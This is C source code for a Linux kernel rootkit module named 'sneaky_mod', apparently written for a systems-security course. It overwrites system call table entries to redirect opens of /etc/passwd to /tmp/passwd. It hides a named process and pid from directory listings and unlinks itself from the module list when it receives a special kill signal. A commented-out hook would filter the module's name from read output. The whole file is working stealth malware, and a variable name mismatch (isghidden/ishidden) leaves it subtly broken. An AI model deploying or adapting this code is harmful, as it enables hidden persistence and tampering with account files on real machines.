#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/slab.h>  // for kmalloc and kfree
#include <linux/dirent.h> 


#define SNEAKY_MOD_NAME "sneaky_mod"

#define PREFIX "sneaky_process"

static char* pid = "";
static struct list_head *prevModule;
static int isghidden = 0;
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid of sneaky module");


//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents64)(struct pt_regs *);
//asmlinkage int (*original_read)(struct pt_regs *);
asmlinkage int (*original_kill)(struct pt_regs *);
// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  char *path = (char *)regs->si;
  if (strcmp(path, "/etc/passwd") == 0) {
    copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
  }
  return (*original_openat)(regs);

}

asmlinkage int sneaky_getdents64(struct pt_regs *regs){
  int ret = original_getdents64(regs);
  struct linux_dirent64 *curr;
  char *kernel_buffer;
  int curr_byte;
  if(ret > 0){
    kernel_buffer = kmalloc(ret, GFP_KERNEL);
    if (copy_from_user(kernel_buffer, (void *)regs->si, ret) != 0) {
      printk(KERN_ALERT "Failed to copy user data to kernel space\n");
      kfree(kernel_buffer);
      return -EFAULT;
    }

    curr_byte = 0;
    curr = (struct linux_dirent64 *)kernel_buffer;
    while (curr_byte < ret) {
      int curr_len = curr->d_reclen;
      if (strcmp(PREFIX, curr->d_name) == 0 || strcmp(pid, curr->d_name) == 0) {
        void *next = (void *)curr + curr_len;
        int rest = (void *)(kernel_buffer + ret) - next;
        memmove((void *)curr, next, rest);
        ret -= curr_len;
        continue;
      }
      curr_byte += curr_len;
      curr = (struct linux_dirent64 *)(kernel_buffer + curr_byte);
    }

    if (copy_to_user((void *)regs->si, kernel_buffer, ret) != 0) {
      printk(KERN_ALERT "Failed to copy kernel data to user space\n");
      kfree(kernel_buffer);
      return -EFAULT;
    }

    kfree(kernel_buffer);
  }
  return ret;
}
asmlinkage int sneaky_sys_kill(struct pt_regs *regs) {
  void hide_module(void);
  void unhide_module(void);

  int sig = regs->si;
  if (sig == 52) {
    if (ishidden == 0) {
      hide_module();
      ishidden = 1;
    } else {
      unhide_module();
      ishidden = 0;
    }
    return 0;
  } else {
    return original_kill(regs);
  }
}

void hide_module(void) {
  prevModule = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
}

void unhide_module(void) { list_add(&THIS_MODULE->list, prevModule); }


// asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
// {
//   ssize_t ret = original_read(regs);
//   char *next_start;
//   char *next_end;
  
//   if (ret > 0) {
//     char *kernel_buffer = kmalloc(ret, GFP_KERNEL);
//     if (copy_from_user(kernel_buffer, (void *)regs->si, ret) != 0) {
//       printk(KERN_ALERT "Failed to copy user data to kernel space\n");
//       kfree(kernel_buffer);
//       return -EFAULT;
//     }

//     next_start = strnstr(kernel_buffer, "sneaky_mod", ret);
//     while (next_start != NULL) {
//       next_end = strnstr(next_start, "\n", ret - (next_start - kernel_buffer));
//       if (next_end != NULL) {
//         int size = next_end - next_start + 1;
//         memmove(next_start, next_end + 1, ret - (next_start - kernel_buffer) - size);
//         ret -= size;
//       }
//       next_start = strnstr(kernel_buffer, "sneaky_mod", ret);
//     }

//     if (copy_to_user((void *)regs->si, kernel_buffer, ret) != 0) {
//       printk(KERN_ALERT "Failed to copy kernel data to user space\n");
//       kfree(kernel_buffer);
//       return -EFAULT;
//     }

//     kfree(kernel_buffer);
//   }
//   return ret;
// }



// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  //original_read = (void *)sys_call_table[__NR_read];
  original_kill = (void *)sys_call_table[__NR_kill];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  
  //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  sys_call_table[__NR_kill] = (unsigned long)sneaky_sys_kill;
  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  //hide_module();

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;

  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  sys_call_table[__NR_kill] = (unsigned long)original_kill;
 
  //sys_call_table[__NR_read] = (unsigned long)original_read;


  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  

  //unhide_module();
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yitao Shi");
MODULE_DESCRIPTION("change passwd sneakily");